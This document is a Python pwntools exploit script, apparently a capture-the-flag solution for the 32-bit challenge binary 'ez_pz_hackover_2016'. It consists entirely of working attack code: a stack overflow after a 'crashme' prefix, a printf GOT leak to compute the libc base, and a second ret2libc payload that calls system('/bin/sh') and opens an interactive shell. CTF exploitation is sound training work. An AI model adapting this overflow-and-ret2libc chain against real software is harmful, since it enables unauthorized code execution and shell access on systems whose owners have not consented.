from pwn import *
context.log_level = 'debug'
#io = process('./ez_pz_hackover_2016')
io = gdb.debug('./ez_pz_hackover_2016','break chall')
elf = ELF('./ez_pz_hackover_2016')
Lib = ELF('/lib/i386-linux-gnu/libc.so.6')

io.recvuntil(b'Yippie, lets crash: ')
s_addr = io.recv(10)
print(s_addr)

payload1 = b'crashme\x00'
payload1 = payload1.ljust(0x1a,b'\x00')
payload1 += p32(elf.plt['printf'])+p32(elf.sym['main'])+p32(elf.got['printf'])
io.sendlineafter('> ',payload1)
printf_addr = u32(io.recv(4))
print('printf_addr->',hex(printf_addr))

Liboffset = printf_addr - Lib.sym['printf']
sys_addr = Liboffset + Lib.sym['system']
bin_sh_addr = Liboffset +next(Lib.search(b'/bin/sh'))

payload2 = b'crashme\x00'
payload2 = payload2.ljust(0x1a,b'\x00')
payload2 += p32(sys_addr)+p32(elf.sym['main'])+p32(bin_sh_addr)
io.sendlineafter('> ',payload2)
io.interactive()

